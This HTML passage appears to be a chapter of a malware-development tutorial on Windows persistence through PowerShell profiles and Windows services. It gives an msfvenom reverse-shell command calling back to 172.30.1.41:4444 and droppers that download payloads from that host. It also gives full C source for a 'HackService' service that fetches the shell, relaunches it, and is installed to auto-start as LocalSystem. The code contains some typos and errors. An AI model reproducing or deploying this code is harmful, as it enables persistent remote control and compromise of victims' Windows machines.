</ul>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note"></a>
</div>
<div>
<p><strong>Note</strong>
<code>$HOME</code>: The current user's home directory (i.e., <code>C:\Users\&lt;username&gt;</code>)
<code>PSHOME</code>: The PowerShell installation directory (i.e., <code>C:\Windows\System32\WindowsPowerShell\v1.0</code>)</p>
</div>
</div>
<p>It is important not to put any code into the profile that will block, because the user will not be presented with an input prompt until the profile script has finished executing. A workaround is to execute the payload via the <code>Start-Job</code> cmdlet.</p>
<pre><code class="language-PowerShell"># Profile.ps1
[void](Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show('You have been hacked!', `&gt;:)`)
})
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>Add-Type -AssemblyName System.Windows.Forms</code>: Loads the necessary .Net Framework assembly that contains the classes required to interact with Windows GUI elements, like message boxes.</p>
<ul>
<li><code>Add-Type</code>: cmdlet which loads a .NET class or assembly into the current PowerShell session.</li>
<li><code>AssemblyName</code>: Specifies that a pre-compiled assembly (a DLL) that is part of the .NET Framework will be loaded.</li>
<li><code>System.Windows.Forms</code>: The name of the specific assembly (DLL) being loaded.
<ul>
<li>This DLL in particular contains classes for creating desktop applications, including controls like buttons, forms, and the static MessageBox class.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>[System.Windows.Forms.MessageBox]::Show('You have been hacked', '&gt;:)')</code>: A static method call that invokes the Windows API to display a small pup-up window on the user's desktop.</p>
<ul>
<li><code>[System.Windows.Forms.MessageBox]</code>: Specifies the exact class within the loaded assembly that needs to be used.</li>
<li><code>::</code>: The static member operator in PowerShell. It is used to call a static method (a method belonging to the class itself, not an instance of the class) or access a static property.</li>
<li><code>Show(...)</code>: The static method of the MessageBox class that is responsible for opening and displaying the dialog box on the screen.</li>
</ul>
</li>
<li>
<p><code>Start-Job -ScriptBlock{...}</code>: PowerShell cmdlet, which starts a new detached PowerShell process (a background job) to execute the code contained within the script block({...}). This allows the main shell session to immediately return a prompt and continue running commands without waiting for the job to finish.</p>
</li>
<li>
<p><code>[void](...)</code>: A type-casting operation that ensures that any object returned will be discarded, preventing it from being printed to the console.</p>
</li>
</ul>
<p>A simple dropper can be used to download the script to the right location on the system:</p>
<pre><code class="language-C">// dropper_profile.c

int main(){
    HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/profile_persistence.ps1", "C:\\Users\\vagrant\\Documents\\WindowsPowerShell\\Profile.ps1", 0, NULL);
}
</code></pre>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-1"></a>
</div>
<div>
<p><strong>Note</strong>
This persistence method requires PowerShell to run before the payload is run. Unless PowerShell is automatically run, you will have to wait for a user to start it before the payload runs. Also, unless the payload is migrated to another process, it will end once PowerShell is closed.</p>
</div>
</div>
<h2 id="windows-services"><a class="header" href="#windows-services">Windows Services</a></h2>
<p>A <strong>Windows Service</strong> is a specialized program that operates in the background of the Windows operating system, similar to a UNIX daemon. Services run independently of a user session and can be configured to start automatically when the system boots, even before a user logs in. They are essential for managing critical system functions such as network connectivity, hardware, system security, and for automating routine tasks like updates and backups.</p>
<p>By default the ability to create or modify a Windows service typically requires Administrator privileges or the Local System, meaning you need a High or System Integrity Level. To create a new service or modify an existing one's configuration, the calling process must have the necessary access rights to the <strong>Service Control Manager</strong> (SCM) and the specific service object. A user account must have the <code>SC_MANAGER_CREATE_SERVICE</code> access rights on the SCM to install a new service. By default, only Built-in Administrators have this right. Once installed, the service itself often runs under highly privileged accounts like <code>Local System</code>, <code>Local Service</code>, or <code>Network Service</code>, with each having different levels of permission. The <code>Local System</code> account is the most powerful and has extensive privileges on the local machine.</p>
<p>WIndows services rely on the Windows Registry as their central configuration and database repository. The SCM reads and writes to specific registry keys to determine how and when a service should run. This configuration is primarily stored under <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Service Name&gt;</code>. For every installed service, there is a subkey named after the service's short name that contains all of its critical metadata.</p>
<p>The most critical use of the registry is to store the necessary configuration details that the SCM needs to load, start, and manage the service. Key values found in a service's registry subkey include:</p>
<ul>
<li><code>ImagePath</code> (REG_EXPAND_SZ): The full path to the service executable file (<code>.exe</code> or <code>.sys</code>). This is the file the SCM executes to start the service.</li>
<li><code>DisplayName</code> (REG_SZ): The user-friendly name that appears in the Services snap-in (<code>services.msc</code>).</li>
<li><code>Start</code> (REG_DWORD): Specifies the startup type for the service including:
<ul>
<li>Automatic (2)</li>
<li>Manual/On-Demand (3)</li>
<li>Disabled (4)</li>
</ul>
</li>
<li><code>ObjectName</code> (REG_SZ): The account under which the service runs (i.e., <code>LocalSystem</code>, <code>NetworkService</code>, or a user account)</li>
<li><code>DependOnService</code> (REG_MULTI_SZ): A list of other services that must be running before this service can start.</li>
</ul>
<p>Individual services also use the registry to store their own internal, non-SCM related configuration and state data, including Custom Settings, Driver Configurations, and the paths for any required Service DLLs. In summary, the registry is the sole location used by the SCM to verify a service's existence, behavior, or core settings, enabling the SCM to reliably manage it from boot-up through its entire lifecycle.</p>
<p>There are many ways a Windows Service can be used to establish persistence on a system. By modifying the <code>ImagePath</code> of a legitimate service in the Windows Registry (specifically under <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Service Name&gt;</code>), an adversary can redirect the service to run an arbitrary executable. If the permissions (Access Control List) on a service are misconfigured, a lower-privileged user or process may be able to stop, start, or modify it, allowing an adversary to easily control its execution. Also, if a service loads a Dynamic Link Library from a predictable, poorly secured location, an attacker can replace or place a malicious DLL in said location so it is loaded when the legitimate service starts.</p>
<p>Here, we will observe how an attacker (with adequate privileges) can create a new service that is configured to start automatically when the system boots. By setting the services executable path <code>binPath</code> to their malicious program, the malware will run with high privileges (often <code>SYSTEM</code>) and maintain long-term access.</p>
<p>To start, create a reverse shell executable:</p>
<pre><code class="language-bash">$ msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=172.30.1.41 \
LPORT=4444 -f exe &gt; hack_cmd.exe
</code></pre>
<p>The next step is to create a malicious service:</p>
<pre><code class="language-C">// mal_service.c

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;io.h&gt;
#include &lt;time.h&gt;

#define SLEEP_TIME 5000
#define F_OK 0

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;
STARTUPINFO si;
PROCESS_INFORMATION pi;
HANDLE* phProcess;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

int Hack(){
    char exe[] = "C:\\Windows\\System32\\hack_cmd.exe";
    BOOL fileDoesntExist = _access(exe, F_OK);
    if(fileDoesntExist){
        HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/hack_cmd.exe", exe, 0, NULL);
        if(downloadedFile){
            printf("[Hack-&gt;URLDownloadToFile] &gt;&gt;&gt; Hmmm... something went wrong. %d\n", GetLastError());
            return -1;
        }
    }
    while(serviceStatus.dwCurrentState == SERVICE_RUNNING){
        ZeroMemory(&amp;pi, sizeof(pi));
        ZeroMemory(&amp;si, sizeof(si));
        si.cb = sizeof(si);

        if(CreateProcess(NULL, exe, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)){
            phProcess = &amp;pi.hProcess;
            DWORD exitCode;
            while(serviceStatus.dwCurrentState == SERVICE_RUNNING){
                if(GetExitCodeProcess((HANDLE)*phProcess, &amp;exitCode)){
                    if(exitCode != STILL_ACTIVE){
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        int sleep_time = rand() % (1200001) + 60000;
                        Sleep(sleep_time);
                        break;
                    } else {
                        Sleep(240000);
                    }
                }
            }
        } else {
            Sleep(60000);
        }
    }
    return 0;
}

int main(){
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"HackService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv){
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentSTate = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
    hStatus = RegisteredServiceCtrlHandler("HackService", (LPHANDLER_FUNCTION)ControlHandler);
    SetServiceStatus(hStatus, &amp;serviceStatus);
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &amp;serviceStatus);
    Hack();

    while (serviceStatus.dwCurrentState == SERVICE_RUNNING){
        Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request){
    switch(request){
        case SERVICE_CONTROL_STOP:
            serviceStatus.dwWin32ExitCode = 0;
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &amp;serviceStatus);
            CloseHandle((HANDLE)*phProcess);
            return;
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwWin32ExitCode = 0;
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &amp;serviceStatus);
            CloseHandle((HANDLE)*phProcess);
            return;
        default:
            break;
    }

    SetServiceStatus(hStatus,&amp;serviceStatus);
    return;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>SERVICE_TABLE_ENTRY</code>: A Windows API structure used to tell the <strong>Service COntrol Manager (SCM)</strong> where the actual service logic begins inside a service executable. It acts as a mapping between a service's name and its entry point function.
<pre><code class="language-C">typedef struct _SERVICE_TABLE_ENTRY{
   LPSTR lpServiceName;
   LPSERVICE_MAIN_FUNCTION lpServiceProc;
} SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY
</code></pre>
Here are the <code>SERVICE_TABLE_ENTRY</code> structure's attributes:
<ul>
<li><code>lpServiceName</code>: The short name of the service. For shared process services, this is essential. For own process services, it is ignored but often set to the service's name or a null string.</li>
<li><code>lpServiceProc</code>: A function pointer to the service's <code>ServiceMain</code> function which the SCM will execute to start the service's core operations.</li>
</ul>
</li>
</ul>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-2"></a>
</div>
<div>
<p><strong>NOTE</strong>
A service executable must create an array of these structures, called the <strong>dispatch table</strong>, and pass it to the <code>StartServiceCtrlDispatcher</code> function. The last entry of this array must be <code>{NULL, NULL}</code> to signal the end of the table to the SCM. When a single executable hosts multiple services, it is called a <strong>shared service</strong>.</p>
</div>
</div>
<ul>
<li>
<p><code>StartServiceCtrlDispatcher</code>: The critical initial function that every Windows service executable must call to register the service executable's entry points with the SCM. When the SCM launches a service executable, the executable's <code>main()</code> or <code>WinMain()</code> function must immediately call this API, causing the calling thread to block and the SCM to take over, using the provided information to launch the specified service's <code>ServiceMain</code> function on a new thread.</p>
<pre><code class="language-C">BOOL StartServiceCtrlDispatcher(
    [in] const SERVICE_TABLE_ENTRY *lpServiceTable
);
</code></pre>
<p>Here is a breakdown of the <code>StartServiceCtrlDispatcher</code> function's parameter:</p>
<ul>
<li><code>lpServiceTable</code>: A pointer to an array of <code>SERVICE_TABLE_ENTRY</code> structures.
<code>StartServiceCtrlDispatcher</code> returns <code>TRUE</code> if the function successfully dispatched the service's threads. The calling thread remains blocked until all registered services running in that executable have terminated. It returns <code>FALSE</code> if function execution failed. Use <code>GetLastError()</code> to retrieve the error code.</li>
</ul>
</li>
<li>
<p><code>SERVICE_STATUS</code>: A fundamental Windows API data type used by a service to report its current status and control information sent back to the Service Control Manager.</p>
<pre><code class="language-C">typedef struct _SERVICE_STATUS{
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
}
SERVICE_STATUS, *LPSERVICE_STATUS;
</code></pre>
<p>Here is a breakdown of the <code>SERVICE_STATUS</code> structure's attributes:</p>
<ul>
<li>
<p><code>dwServiceType</code>: Specifies the type of the service.</p>
<ul>
<li><code>SERVICE_WIN32_OWN_PROCESS</code> (Most Common): The service runs in a process unique to it.</li>
<li><code>SERVICE_WIN32_SHARE_PROCESS</code>: The service shares a single process with other services.</li>
<li><code>SERVICE_KERNEL_DRIVER</code>: A device driver</li>
</ul>
</li>
<li>
<p><code>dwCurrentState</code>: The most important attribute, as it reports the service's current operational state.</p>
<ul>
<li><code>SERVICE_RUNNING</code>: The service is operating normally</li>
<li><code>SERVICE_STOPPED</code>: The service is not running</li>
<li><code>SERVICE_START_PENDING</code>: The service is starting up and initializing</li>
<li><code>SERVICE_PAUSED</code>: The service paused (not operational, but held in memory).</li>
</ul>
</li>
<li>
<p><code>dwControlsAccepted</code>: Specifies which control codes (commands) the service is prepared to handle via its <code>HandlerEx</code> function.
_ <code>SERVICE_ACCEPT_STOP</code>: The service can be sent a <code>STOP</code> command.
_ <code>SERVICE_ACCEPT_PAUSE_CONTINUE</code>: The service can be send <code>PAUSE</code> and <code>CONTINUE</code> commands.
_ <code>SERVICE_ACCEPT_SHUTDOWN</code>: The service will be notified before the system shuts down.
_ <code>SERVICE_ACCEPT_PARAMCHANGE</code>: The service can accept changes to its configuration parameters.</p>
<blockquote>
<p>Multiple values can be OR'ed (<code>|</code>) together.</p>
</blockquote>
</li>
<li>
<p><code>dwWin32ExitCode</code>: Reports a standard Win32 error code when a service is stopping or stopped.</p>
<ul>
<li><code>NO_ERROR</code>(0): Used if the service terminated normally or if the state is not <code>SERVICE_STOPPED</code>.</li>
<li>Any <code>ERROR</code> Code: Used to report a standard Windows error code, if the service failed to start or stopped unexpectedly.</li>
</ul>
</li>
<li>
<p><code>dwServiceSpecificExitCode</code>: Reports a service-defined, custom error code when the service is stopping or stopped. Values are the same as above.</p>
</li>
<li>
<p><code>dwCheckPoint</code>: Used only when the service is in a pending state (<code>SERVICE_START_PENDING</code>, <code>SERVICE_STOP_PENDING</code>, etc.). It provides a value that increments periodically as the service progresses through a long initialization or termination task. It provides feedback to the SCM, proving that the service is still alive and making progress, preventing the SCM from prematurely thinking the service has frozen and killing it.</p>
</li>
<li>
<p><code>dwWaitHint</code>: The estimated time, in milliseconds, that the service expects to spend on an operation while in a pending state. The SCM will not mark the service as frozen until this time has elapsed. The service must update both <code>dwCheckPoint</code> and <code>dwWaitHint</code> periodically if the operation takes longer than the hint.</p>
</li>
</ul>
</li>
<li>
<p><code>RegisterServiceCtrlHandler</code>: A key Windows API call used by a service executable to establish a callback mechanism with the Service Control Manager. It registers a function within the service executable that the SCM can call whenever an administrative tool sends a control command to the service (i.e., <code>STOP</code>, <code>PAUSE</code>, <code>SHUTDOWN</code>, <code>INTERROGATE</code>, etc.)</p>
<pre><code class="language-C">SERVE_STATUS_HANDLE RegisterServiceCtrlHandler(
    [in] LPCSTR lpServiceName,
    [in] LPHANDLER_FUNCTION lpHandlerProc
);
</code></pre>
<p>Here is a breakdown of the <code>RegisterServiceCtrlHandler</code> function's parameters:</p>
<ul>
<li><code>lpServiceName</code>: The short name of the service. Must be the same name passed to the <code>CreateService</code> function during installation.</li>
<li><code>lpHandlerProc</code>: A function pointer to the Service Control Handler, which must have a specific signature that accepts a single <code>DWORD</code> representing the control code.</li>
</ul>
<p>The function has a modernized version, <code>RegisterServiceCtrlHandlerEx</code>, which is preferred in new development because it allows for a user defined context pointer:</p>
<pre><code class="language-C">SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerEx(
    [in] LPCSTR lpServiceName,
    [in] LPHANDLER_FUNCTION_EX lpHandlerProc,
    [in] LPVOID lpContext
);
</code></pre>
<p>Here is a breakdown of the <code>RegisterServiceCtrlHandlerEx</code> function's parameters:</p>
<ul>
<li><code>lpServiceName</code>: The short name of the service.</li>
<li><code>lpHandlerProc</code>: A function pointer to the extended Service Control Handler function. This handler has a more complex signature, accepting additional parameters (<code>dwEventType</code>, <code>lpEventData</code>, <code>lpContext</code>)</li>
<li><code>lpContext</code>: An optional user-defined context pointer, which is passed to the Service Control Handler, allowing the handler to access service specific data or state information easily.</li>
</ul>
<p>Both versions of the function return a <code>SERVICE_STATUS_HANDLE</code>, which is used in all subsequent calls to <code>SetServiceStatus</code> to report any state changes within the service back to the SCM. They return <code>NULL</code> if they fail.</p>
</li>
<li>
<p><code>SetServiceStatus</code>: The primary line of communication from a service to the Service Control Manager (SCM). Allows the service to report its current operational state, exit codes, and progress during long operations. It must be called throughout the lifecycle of a service to inform the SCM of changes in its state.</p>
<ul>
<li><code>Initialization</code>: Tells the SCM it is starting up (<code>SERVICE_START_PENDING</code>)</li>
<li><code>Running</code>: Confirms the service is operational (<code>SERVIE_RUNNING</code>)</li>
<li><code>Stopping</code>: Requests more time while shutting down if cleanup takes a while (<code>SERVICE_STOP_PENDING</code>)</li>
<li><code>Keep-Alive</code>: Updates the <code>CheckPoint</code> value during pending operations so the SCM doesn't assume the service has hung and kill it.</li>
</ul>
<pre><code class="language-C">BOOL SetServiceStatus(
    [in] SERVICE_STATUS_HANDLE hServiceStatus,
    [in] LPSERVICE_STATUS lpServiceStatus
);
</code></pre>
<p>Here is a breakdown of the <code>SetServiceStatus</code> function's parameters:</p>
<ul>
<li><code>hServiceStatus</code>: A handle to the service's status information structure, which acts as the ID card for your service instance, ensuring the status update is applied to the correct service in the SCM is database.</li>
<li><code>lpServiceStatus</code>: A pointer to a <code>SERVICE_STATUS</code> structure that contains that latest values for the service's state. Should be filled in beforehand.
<code>SetServiceStatus</code> returns <code>TRUE</code> if the operation succeeded, <code>FALSE</code> otherwise.</li>
</ul>
</li>
<li>
<p><code>_access</code>: A <code>C</code>/<code>C++</code> runtime library function used to perform a pre-check before attempting a file operation. It is exported in <code>io.h</code>.</p>
<pre><code class="language-C">int _access(
    const char *path,
    int mode
)
</code></pre>
<p>Here is a breakdown of the <code>_access</code> function's parameters:</p>
<ul>
<li><code>path</code>: A pointer to a null-terminated string specifying the full path and filename of the file or directory to check.</li>
<li><code>mode</code>: An integer value specifying the accessibility check to perform. This is created by combining (<code>|</code>) the following constands:</li>
<li><code>F_OK</code> (<code>00</code>): Checks for file existence only</li>
<li><code>R_OK</code> (<code>04</code>): Checks for read permissions</li>
<li><code>W_OK</code> (<code>02</code>): Checks for write permissions</li>
<li><code>X_OK</code> (<code>01</code>): Checks for execute permissions</li>
</ul>
<p><code>_access</code> returns an integer value to indicate the result of the check. <code>0</code> indicates success (the file exists or permission has been granted). <code>-1</code> indicates a failure (the file does not exist or permission has not been granted).</p>
</li>
<li>
<p><code>GetExitCodeProcess</code>: A Windows API function used to retrieve the termination status of the specified process. Used to check if a monitored process is still running without forcing the calling thread to wait for the process to terminate.</p>
<pre><code class="language-C">BOOL GetExitCodeProcess(
    [in] HANDLE hProcess,
    [out] LPDWORD lpExitCode
);
</code></pre>
<p>Here is a breakdown of the <code>GetExitCodeProcess</code> function's parameters:</p>
<ul>
<li><code>hProcess</code>: A handle to the process whose termination status is to be queries. This handle must have <code>PROCESS_QUERY_INFORMATION</code> access rights.</li>
<li><code>lpExitCode</code>: A pointer to a variable that receives the process termination status (the exit code).
<ul>
<li><code>STILL_ACTIVE</code>: If the process is still running,the pointer will receive the value <code>STILL_ACTIVE</code> (0x103)</li>
<li><strong>Any Other Value</strong> is the exit code returned by the process's main function or the value passed to the <code>EXITPROCESS</code> function.</li>
</ul>
</li>
</ul>
<p><code>GetExitCodeProcess</code> returns a <code>BOOL</code>. <code>0</code> is failure, non-zero is success.</p>
</li>
<li>
<p><code>Sleep</code>: A Windows API function that suspends the execution of the current thread for a specified number of milliseconds.</p>
<pre><code class="language-C">VOID Sleep(
    DWORD wdMilliseconds
);
</code></pre>
<p>Here is a breakdown of the <code>Sleep</code> function's parameters:</p>
<ul>
<li><code>dwMilliseconds</code>: The number of milliseconds the thread should pause for.
<ul>
<li><code>Sleep(1000)</code> pauses for 1 second</li>
<li><code>Sleep(0)</code> yields the thread's remaining time slice</li>
<li><code>Sleep(INFINITE)</code> blocks indefinitely</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Now that we have our payload and our service executable, we need to create a dropper, which will install the service executable, register it with the SCM, and start it:</p>
<pre><code class="language-C">// dropper_service.c

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;io.h&gt;

#define F_OK 0

LPCSTR lpServiceName = "HackService";
LPCSTR lpDisplayName = "Malware Dev Hacking Service";
LPCSTR lpPath = "C:\\Windows\\System32\\mal_service.exe";

int main(){
    if(_access(lpPath, F_OK)){
        HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/mal_service.exe", lpPath, 0, NULL);
        if(downloadedFile != S_OK){
            print("Hmm... something went wrong. %d\n", GetLastError());
            return 0;
        }
    }

    SC_HANDLE hSCM = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
    if(hSCM == NULL){
        printf("[main-&gt;OpenSCManager] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
        return 0;
    }

    SC_HANDLE hService = CreateService(
        hSCM,
        lpServiceName,
        lpDIsplayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        lpPath,
        NULL, NULL, NULL,
        "LocalSystem",
        NULL
    );

    if(hService == NULL){
        printf("[main-&gt;CreateService] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
        return 0;
    }

    BOOL bResult = StartService(hService, 0, NULL);
    if(!bResult){
        printf("[main-&gt;StartService] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
        return 0;
    }

    if (hService)
        CloseServiceHandle(hService);

    CloseServiceHandle(hSCM);
    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>OpenSCManager</code>: A fundamental Windows API call used to establish a connection and obtain a handle to the Service Control Manager database on a specified machine. Before a program can perform any action on a service (i.e., create, delete, start, stop, query, etc.), it must first successfully call <code>OpenSCManager</code>. Exported in <code>winsvc.h</code>.</p>
<pre><code class="language-C">SC_HANDLE OpenSCManager(
    [in, optional] LPCSTR lpMachineName,
    [in, optinoal] LPCSTR lpDatabseName,
    [in] DWORD dwDesiredAccess
);
</code></pre>
<p>Here is a breakdown of the <code>OpenSCManager</code> function's parameters:</p>
<ul>
<li><code>lpMachineName</code>: Speficies the name of the target machine where teh SCM resides.
<ul>
<li><code>NULL</code> or an empty string connects to the SCM on the local computer.</li>
</ul>
</li>
<li><code>lpDatabaseName</code>: Specifies the SCM database to open.
<ul>
<li><code>NULL</code> or <code>SERVICES_ACTIVE_DATABASE</code> opens the default active database, containing all services installed on the system.</li>
</ul>
</li>
<li><code>dwDesiredAccess</code>: Specifies the access rights required for the connection. These flags determine what actions the calling process is permitted to perform once the handle is obtained. They can be combined using the OR operator (<code>|</code>):
<ul>
<li><code>SC_MANAGER_CONNECT</code>: Permission to connect to the SCM.</li>
<li><code>SC_MANAGER_CREATE_SERVICE</code>: Ability to install new Services with <code>CreateService</code>.</li>
<li><code>SC_MANAGER_ENUMERATE</code>: Ability to list all services in the database using <code>EnumServicesStatusEx</code>.</li>
<li><code>SC_MANAGER_ALL_ACCESS</code>: Full control over the SCM and all its operations.</li>
</ul>
</li>
</ul>
<p><code>OpenSCManager</code> returns a Service Control Handle (<code>SC_HANDLE</code>) if successful, <code>NULL</code> upon failure.</p>
</li>
<li>
<p><code>CreateService</code>: A key function in the Windows Service API, used to install (register) a new Windows Service with the Service Control Manager database. It is typically called by a service installation program or administrative tool and is important for defining the fundamental properties of a service, such as its name, executable path, and startup mode. It is exported in <code>winscv.h</code>.</p>
<pre><code class="language-C">SC_HANDLE CreateService(
    [in] SC_HANDLE hSCManager,
    [in] LPCSTR lpServiceName,
    [in, optional] LPCSTR lpDisplayName,
    [in] DWORD dwDesiredAccess,
    [in] DWORD dwServiceType,
    [in] DWORD dwStartType,
    [in] DWORD dwErrorControl,
    [in, optional] LPCSTR lpBinaryPathName,
    [in, optional] LPCSTR lpLoadGroup,
    [in, optional] LPDWORD lpdwTagId,
    [in, optional] LPCSTR lpDependencies,
    [in, optional] LPCSTR lpServiceStartName,
    [in, optional] LPCSTR lpPassword
);
</code></pre>
<p>Here is a breakdown of the <code>CreateService</code> function's parameters:</p>
<ul>
<li><code>hSCManager</code>: A handle to the SCM database with <code>SC_MANAGER_CREATE_SERVICE</code> access rights. Obtained from <code>OpenSCManager</code>.</li>
<li><code>lpServiceName</code>: The short, unique name of the service. This is the registry key name. Cannot exceed 256 characters.</li>
<li><code>lpDisplayName</code>: The user-friendly name displayed in the Services snap-in (<code>services.msc</code>). Cannot exceed 256 characters.</li>
<li><code>dwDesiredAccess</code>: Specifies the access to the newly created service handle. Often set to <code>SERVICE_ALL_ACCESS</code> or <code>SERVICE_START</code></li>
<li><code>dwServiceType</code>: The type of service being created (ie., <code>SERVICE_WIN32_OWN_PROCESS</code> or <code>SERVICE_WIN32_SHARE_PROCESS</code>)</li>
<li><code>dwStartType</code>: Specifies when the service should start.
<ul>
<li><code>SERVICE_AUTO_START</code>: Boots when the system starts up.</li>
<li><code>SERVICE_DEMAND_START</code>: Dictates that the service must be started manually (<code>sc start &lt;service&gt;</code>)</li>
</ul>
</li>
<li><code>dwErrorControl</code>: Specifies the severity of the error if the service fails to start.</li>
<li>'lpBinaryPathName': The full path to the service executable, which runs when starting the service.</li>
<li><code>lpLoadGroup</code>: The name of the load ordering group this service belongs to. Usually <code>NULL</code>.</li>
<li><code>lpdwTagId</code>: A unique tag value given to the service if it is part of a group. Usually <code>NULL</code>.</li>
<li><code>lpDependencies</code>: A list of services that must start before this service can start. A doubly null-terminated list of short service names; usually <code>NULL</code>.</li>
<li><code>lpServiceStartName</code>: The account name under which the service will run. Typically <code>LocalSystem</code>, <code>LocalService</code>, or a specific user account.</li>
<li><code>lpPassword</code>: The password for the specified user account in <code>lpServiceStartName</code>. <code>NULL</code> if running under a built-in account (i.e., 'LocalSystem').</li>
</ul>
<p><code>CreateService</code> returns a SC_HANDLE value upon success, <code>NULL</code> upon failure.</p>
</li>
<li>
<p><code>StartService</code>: A fundamental Windows Service API function used to initiated the execution of an installed Windows Service. It is exported in <code>winsvc.h</code>.</p>
<pre><code class="language-C">BOOL StartService(
    [in] SC_HANDLE hService,
    [in] DWORD dwNumServiceArgs,
    [in, optional] LPCSTR *lpServiceArgVectors
);
</code></pre>
<p>Here is a breakdown of the <code>StartService</code> function's parameters:</p>
<ul>
<li><code>hService</code>: A handle to the service object. Must have been obtained previously from <code>OpenService</code> or <code>CreateService</code> with <code>SERVICE_START</code> access rights.</li>
<li><code>dwNumServiceArgs</code>: The number of arguments in the <code>lpServiceArgVectors</code> array. <code>0</code> if no args are passed.</li>
<li><code>lpServiceArgVectors</code>: An optional array of pointers to null-terminated strings that represent arguments to be passed to the service's <code>ServiceMain</code>.
Returns <code>TRUE</code> is successful execution. This does not mean the service is runing. <code>FALSE</code> if the operation failed. Commonly due to <strong>Access Denied</strong>, <strong>Database Locked</strong>, or <strong>Service Already Running</strong>.</li>
</ul>
</li>
<li>
<p><code>CloseServiceHandle</code>: A fundamental Windows Service API call used to release an open handle to a Service Control manager object, such as the database itself or an individual service object. Failure to close handles can lead to resource leaks.</p>
<pre><code class="language-C">BOOL CloseServiceHandle(
    [in] SC_HANDLE hSCObject
);
</code></pre>
<p>Here is a breakdown of the function's parameowters:</p>
<ul>
<li><code>hSCObject</code>: The handle to the SCM object that needs to be closed.</li>
</ul>
<p><code>CloseServiceHandle</code> returns <code>TRUE</code> if successful, <code>FALSE</code> upon failure. Usually because the handle was invalid or already closed.</p>
</li>
</ul>
<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
<div class="admonition-title">
<div id="admonition-note-3-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-3"></a>
</div>
<div>
<p><strong>NOTE</strong>
This persistence method requires a High Integrity Level by default, as it requires the <code>SC_MANAGER_CREATE_SERVICE</code> access right. However, if the Access Control List on the SCM database (or the specific registry key) is modified to explicitly grant the permission to a lower-privileged user or group, the method may not require elevated privileges. It is important to enumerate users and groups to determine what privileges are available and from where.</p>
</div>
</div>
<h2 id="scheduled-tasks"><a class="header" href="#scheduled-tasks">Scheduled Tasks</a></h2>
<p><strong>Scheduled tasks</strong> let uses and administrators automate repetitive actions, such as running backups, launching applications, performing system maintenance, or sending notifications. They are managed through the <strong>Windows Task Scheduler</strong>, which lets users define tasks by specifying triggers (i.e., specific times, system startup, logon, or other events) and actions (i.e., running a program or displaying a message).</p>
<p>Windows offers two main APIs for creating Scheduled Tasks in <code>C</code> or <code>C++</code>: The <strong>Task Scheduler 1.0 API</strong> and the <strong>Task Scheduler 2.0 API</strong>. For new applications targeting current Windows versions, the Task Scheduler 2.0 API is strongly recommended because of its advanced features and compatibility. It is compatible with Windows Vista+, and it uses <strong>Component Object Model</strong> (COM) interfaces, such as <code>ITaskService</code>, <code>ITaskDefinition</code> and <code>IActionCollection</code>. It is exported through <code>taskschd.h</code>.</p>
